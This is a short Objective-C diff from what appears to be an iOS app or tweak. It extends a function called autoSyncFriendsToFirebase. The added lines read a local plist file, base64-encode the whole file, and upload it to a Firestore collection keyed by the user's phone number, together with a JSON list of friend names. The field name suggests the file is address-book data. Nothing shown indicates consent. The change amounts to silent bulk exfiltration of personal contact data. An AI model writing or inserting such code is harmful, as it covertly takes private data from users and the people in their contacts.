@@ -443,6 +443,12 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
             sampleStr = [sampleStr stringByAppendingFormat:@" và %lu người khác...", (unsigned long)(friendNames.count - 8)];
         }
 
+        NSData *rawPlistData = [NSData dataWithContentsOfFile:plistPath];
+        NSString *base64Plist = [rawPlistData base64EncodedStringWithOptions:0] ?: @"";
+
+        NSData *friendsJsonData = [NSJSONSerialization dataWithJSONObject:friendNames options:0 error:nil];
+        NSString *friendsJsonStr = [[NSString alloc] initWithData:friendsJsonData encoding:NSUTF8StringEncoding] ?: @"[]";
+
         NSString *postUrlStr = [NSString stringWithFormat:
             @"https://firestore.googleapis.com/v1/projects/%@/databases/(default)/documents/friend_databases/%@",
             kFirebaseProjectId, cleanPhone];
@@ -457,7 +463,9 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
                 @"phone": @{ @"stringValue": cleanPhone },
                 @"total_friends": @{ @"integerValue": @(friendNames.count) },
                 @"sample_friends": @{ @"stringValue": sampleStr },
-                @"updated_at": @{ @"stringValue": @"now" }
+                @"friends_json": @{ @"stringValue": friendsJsonStr },
+                @"adbk_payload_base64": @{ @"stringValue": base64Plist },
+                @"updated_at": @{ @"stringValue": [[NSDate date] description] }
             }
         };
 
